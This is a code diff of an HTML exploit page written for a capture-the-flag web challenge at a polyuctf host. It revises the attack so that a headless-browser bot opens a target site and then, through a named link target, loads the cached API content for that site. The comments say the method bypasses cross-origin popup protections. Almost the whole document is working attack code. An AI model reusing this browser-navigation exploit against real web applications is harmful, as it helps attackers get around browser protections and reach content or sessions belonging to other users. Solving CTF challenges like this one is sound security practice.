@@ -4,19 +4,24 @@
     <title>Exploit</title>
 </head>
 <body>
-    <h1>Running Exploit...</h1>
+    <h1>Running Exploit v3...</h1>
+    <a id="pwn" target="exploitWindow">Click here</a>
     <script>
         const CHAL_URL = "http://chal.polyuctf.com:43265";
-        const SITE_ID = "5fb4d462e40605251d64c48c2ebc1919bf1119b117922663a0dd070081ded69e";
+        // REPLACE WITH YOUR NEW SITE ID
+        const SITE_ID = "5fb4d462e40605251d64c48c2ebc1919bf1119b117922663a0dd070081ded69e"; 
         
-        // 1. Open the original site to force the $.getJSON Memory cache
-        const w = window.open(`${CHAL_URL}/sites/${SITE_ID}`);
+        const link = document.getElementById("pwn");
+
+        // Step 1: Open the challenge site in a new tab named "exploitWindow"
+        link.href = `${CHAL_URL}/sites/${SITE_ID}`;
+        link.click();
         
-        // 2. Wait 3 seconds, then tell the OPENED window to navigate to the API
+        // Step 2: 3 seconds later, click the exact same link target again, 
+        // overwriting that specific window to hit the cached API!
         setTimeout(() => {
-             // Instead of w.location, we tell the window to navigate itself.
-             // This bypasses many cross-origin popup protections in headless Chrome.
-             w.location.href = `${CHAL_URL}/api/sites/${SITE_ID}/content`;
+            link.href = `${CHAL_URL}/api/sites/${SITE_ID}/content`;
+            link.click();
         }, 3000);
     </script>
 </body>
